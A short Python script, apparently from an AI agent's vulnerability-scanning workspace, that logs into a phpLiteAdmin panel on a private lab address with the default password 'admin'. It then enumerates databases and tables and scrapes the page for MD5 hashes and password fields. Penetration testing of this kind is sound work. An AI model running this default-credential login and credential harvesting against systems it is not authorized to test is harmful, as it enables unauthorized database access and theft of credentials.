import urllib.request, urllib.parse, http.cookiejar, re, socket
socket.setdefaulttimeout(15)
base = "http://192.168.18.132"

cj = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

# Login
login_url = base + "/dbadmin/test_db.php"
post_data = urllib.parse.urlencode({"password": "admin", "login": "Login"}).encode()
req = urllib.request.Request(login_url, data=post_data, headers={
    "User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"
})
opener.open(req, timeout=10)

# Get main page
req = urllib.request.Request(login_url, headers={"User-Agent": "Mozilla/5.0"})
resp = opener.open(req, timeout=10)
html = resp.read().decode("utf-8", errors="ignore")

print("=== Main Page Analysis ===")
# Find all links/actions
actions = re.findall(r'action=(\w+)', html)
databases = re.findall(r'database=([^&"\x27>\s]+)', html)
tables = re.findall(r'table=([^&"\x27>\s]+)', html)

print(f"Actions: {set(actions)}")
print(f"Databases: {set(databases)}")
print(f"Tables: {set(tables)}")

# Look for anything interesting
print("\n=== Looking for credentials in HTML ===")
# MD5 hashes pattern
md5s = re.findall(r'[a-f0-9]{32}', html)
if md5s:
    print(f"MD5 hashes found: {md5s[:5]}")

# password fields
passes = re.findall(r'(password|passwd)\s*[=:]\s*["\x27]?([^\s"<>]+)', html, re.I)
for p in passes[:10]:
    print(f"  {p[0]} = {p[1]}")

# Save full HTML for analysis
with open("C:/Users/HZR/.qclaw/workspace-agent-b7ed571b/wvs-v18/reports/phpliteadmin_main.html", "w") as f:
    f.write(html)
print(f"\nSaved full HTML to phpliteadmin_main.html ({len(html)} bytes)")
